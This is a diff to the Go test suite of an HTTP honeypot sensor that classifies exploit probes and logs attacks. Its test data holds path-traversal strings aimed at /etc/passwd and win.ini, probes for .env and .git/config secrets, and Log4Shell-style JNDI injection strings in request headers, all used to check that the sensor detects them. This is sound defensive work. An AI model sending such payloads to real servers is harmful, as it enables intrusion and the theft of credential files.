@@ -2,6 +2,7 @@ package trap
 
 import (
 	"context"
+	"encoding/json"
 	"io"
 	"log/slog"
 	"net/http"
@@ -37,6 +38,28 @@ func TestMatchExploitPath(t *testing.T) {
 		{"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", true},
 		{"/static/../../etc/passwd", true},
 		{"/jenkins/script", true},
+		{"/" + strings.Repeat("a", 1100) + "/../.env", true},
+		{strings.Repeat("a", maxHTTPPath+1), true},
+		{"/%2e%2e/%2e%2e/etc/passwd", true},
+		{"/a/%252e%252e/secret", true},
+		{"/%252e%252e/%252e%252e/etc/passwd", true},
+		{"/a/..%5c..%5cwindows/win.ini", true},
+		{`/a\..\b`, true},
+		{"/.env;jsessionid=1", true},
+		{"/a;x=1/.git/config", true},
+		{"//.env", true},
+		{"/./.env", true},
+		{"/x/.env", true},
+		{"/windows/win.ini", true},
+		{"/actuator;a=b/env", true},
+		{"/darwin.ini", false},
+		{"/.environment", false},
+		{"/myadministrator", false},
+		{"/actuators", false},
+		{"/phpmyadmin2", false},
+		{"/docs/environment.html", false},
+		{"/a.b/c..d/e", false},
+		{"/gitignore", false},
 		{"", false},
 		{"/", false},
 		{"/index.html", false},
@@ -162,20 +185,31 @@ func TestHTTPRequestClassification(t *testing.T) {
 		{name: "json post", method: "POST", path: "/api/login", headers: map[string]string{"Content-Type": "application/json"}, body: json300, attack: true, wantPath: "/api/login", wantBytes: 300},
 		{name: "json put", method: "PUT", path: "/api/x", headers: map[string]string{"Content-Type": "application/json"}, body: `{"a":1}`, attack: true, wantPath: "/api/x", wantBytes: 7},
 		{name: "form login", method: "POST", path: "/wp-login.php", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body: "log=admin&pwd=x", attack: true, wantPath: "/wp-login.php", wantAuth: 1, wantUser: "admin"},
+		{name: "basic bare username", method: "GET", path: "/", headers: map[string]string{"Authorization": "Basic YWRtaW4="}, attack: true, wantPath: "/", wantAuth: 1, wantUser: "admin"},
+		{name: "patch body", method: "PATCH", path: "/api/x", headers: map[string]string{"Content-Type": "application/json"}, body: `{"a":1}`, attack: true, wantPath: "/api/x", wantBytes: 7},
+		{name: "oversized json body", method: "POST", path: "/api/big", headers: map[string]string{"Content-Type": "application/json"}, body: strings.Repeat("a", 20000), attack: true, wantPath: "/api/big", wantBytes: maxHTTPBody},
+		{name: "empty post", method: "POST", path: "/login", attack: true, wantPath: "/login", wantAuth: 1},
+		{name: "oversized form", method: "POST", path: "/login", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body: "log=" + strings.Repeat("a", 20000), attack: true, wantPath: "/login", wantAuth: 1},
+		{name: "jndi forwarded server", method: "GET", path: "/", headers: map[string]string{"X-Forwarded-Server": "${jndi:ldap://x/a}"}, attack: true, wantPath: "/"},
+		{name: "lookalike path", method: "GET", path: "/darwin.ini"},
+		{name: "environment path", method: "GET", path: "/.environment"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			addr, sink := startHTTPSensor(t)
 			httpDo(t, addr, tc.method, tc.path, tc.headers, tc.body)
-			evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(e) > 0 })
-			att := attackEvents(evs)
 			if !tc.attack {
-				if len(att) != 0 || hasClass(evs, alert.ClassScan) {
-					t.Fatalf("want probe only, got %+v", evs)
+				// The probe event is emitted at session end; wait for it, then
+				// check that nothing else was recorded.
+				evs := sink.waitEvents(t, func(e []alert.Event) bool { return hasClass(e, alert.ClassProbe) })
+				if len(evs) != 1 || evs[0].Class != alert.ClassProbe {
+					t.Fatalf("want a single probe event, got %+v", evs)
 				}
 				return
 			}
+			evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(attackEvents(e)) > 0 })
+			att := attackEvents(evs)
 			if len(att) != 1 {
 				t.Fatalf("want exactly one attack event, got %+v", evs)
 			}
@@ -263,5 +297,107 @@ func TestHTTPRequestLogging(t *testing.T) {
 		if strings.Contains(out, bad) {
 			t.Errorf("log leaks %q:\n%s", bad, out)
 		}
+	}
+}
+
+// Several exploit requests on one keep-alive connection: the session is attack,
+// every request is recorded as a command and nothing breaks.
+func TestHTTPKeepAliveExploitRequests(t *testing.T) {
+	t.Parallel()
+	addr, sink := startHTTPSensor(t)
+	client := &http.Client{Transport: &http.Transport{}, Timeout: 5 * time.Second}
+	for _, p := range []string{"/.env", "/.git/config", "/actuator/env"} {
+		resp, err := client.Get("http://" + addr + p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		_, _ = io.Copy(io.Discard, resp.Body)
+		resp.Body.Close()
+	}
+	client.CloseIdleConnections()
+	evs := sink.waitEvents(t, func(e []alert.Event) bool {
+		for _, ev := range attackEvents(e) {
+			if ev.Info.Commands == 3 {
+				return true
+			}
+		}
+		return false
+	})
+	for _, ev := range attackEvents(evs) {
+		if ev.Info.SourceIP != "127.0.0.1" {
+			t.Errorf("source ip = %q", ev.Info.SourceIP)
+		}
+	}
+}
+
+// A body that cannot be read completely (client gone) is not a credential login.
+func TestHTTPBodyReadErrorIsNotLogin(t *testing.T) {
+	t.Parallel()
+	addr, sink := startHTTPSensor(t)
+	conn := dialTrap(t, addr)
+	if _, err := io.WriteString(conn, "POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: 50\r\n\r\n"); err != nil {
+		t.Fatal(err)
+	}
+	conn.Close()
+	evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(e) > 0 })
+	for _, ev := range evs {
+		if ev.Info.AuthAttempts != 0 || ev.Class != alert.ClassProbe {
+			t.Errorf("read error counted as login: %+v", ev)
+		}
+	}
+}
+
+// The headers group carries the documented subset and never Cookie or Authorization.
+func TestHTTPHeaderSubsetLogged(t *testing.T) {
+	SetPasswordLogMode("off")
+	buf := &syncBuffer{}
+	cfg := httpTestConfig(t)
+	m := metrics.New(prometheus.NewRegistry(), "test")
+	tr := NewHTTP(cfg, slog.New(slog.NewJSONHandler(buf, nil)), m, NewLimiter(10, 10), alert.NoopAlerter{})
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	addr := serveTrap(t, ctx, tr)
+
+	httpDo(t, addr, "GET", "/index.html", map[string]string{
+		"Cookie":          "session=topsecret",
+		"Authorization":   "Bearer topsecret",
+		"Referer":         "https://example.com/",
+		"Accept-Language": "en",
+		"X-Custom":        "nope",
+	}, "")
+
+	var headers map[string]any
+	deadline := time.Now().Add(5 * time.Second)
+	for headers == nil && time.Now().Before(deadline) {
+		for _, line := range strings.Split(buf.String(), "\n") {
+			var rec map[string]any
+			if json.Unmarshal([]byte(line), &rec) == nil {
+				if h, ok := rec["headers"].(map[string]any); ok {
+					headers = h
+				}
+			}
+		}
+		time.Sleep(5 * time.Millisecond)
+	}
+	if headers == nil {
+		t.Fatalf("no headers group logged:\n%s", buf.String())
+	}
+	if headers["referer"] != "https://example.com/" || headers["accept-language"] != "en" {
+		t.Errorf("headers = %v", headers)
+	}
+	for _, bad := range []string{"cookie", "authorization", "x-custom"} {
+		if _, ok := headers[bad]; ok {
+			t.Errorf("headers group contains %q: %v", bad, headers)
+		}
+	}
+}
+
+func TestHTTPHasJNDIAllHeaderValues(t *testing.T) {
+	t.Parallel()
+	r, _ := http.NewRequest("GET", "http://x/", nil)
+	r.Header.Add("X-Forwarded-For", "8.8.8.8")
+	r.Header.Add("X-Forwarded-For", "${jndi:ldap://x/a}")
+	if !httpHasJNDI(r) {
+		t.Error("second header value not scanned")
 	}
 }
